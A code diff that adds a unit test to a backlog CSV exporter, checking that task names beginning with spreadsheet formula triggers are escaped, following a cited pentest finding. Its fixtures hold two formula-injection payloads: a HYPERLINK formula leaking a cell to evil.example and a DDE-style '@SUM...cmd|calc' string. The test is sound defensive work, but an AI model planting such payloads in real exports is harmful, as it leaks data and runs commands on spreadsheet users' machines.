@@ -86,6 +86,19 @@ describe('backlogCsv', () => {
     expect(rows[0]).toBe('Rank,Task,Category,Volume/mo,Min each,Sensitivity,Hours now,Hours saved,Pattern');
     expect(rows[1]).toContain('1,"Report, weekly"');
   });
+  it('neutralizes formula triggers in task names (pentest 2026-11-22 N3)', () => {
+    const scored = rankBacklog(data, [
+      task({ name: '=HYPERLINK("https://evil.example/?"&A1,"open")', category: 'reporting', volume: 4, minutes: 60 }),
+      task({ name: '@SUM(1+1)*cmd|calc', category: 'reporting', volume: 2, minutes: 60 }),
+    ]);
+    const rows = backlogCsv(scored).split('\n');
+    expect(rows[1]).toContain(`1,"'=HYPERLINK(""https://evil.example/?""&A1,""open"")",`);
+    expect(rows[2]).toContain("2,'@SUM(1+1)*cmd|calc,");
+    for (const row of rows.slice(1)) {
+      // Split on commas outside quotes; no cell may start with a bare trigger.
+      for (const cell of row.match(/("([^"]|"")*"|[^,]*)(,|$)/g) ?? []) expect(cell.replace(/^"/, '')).not.toMatch(/^[=+\-@\t\r]/);
+    }
+  });
 });
 
 describe('automation-roi.json data integrity', () => {
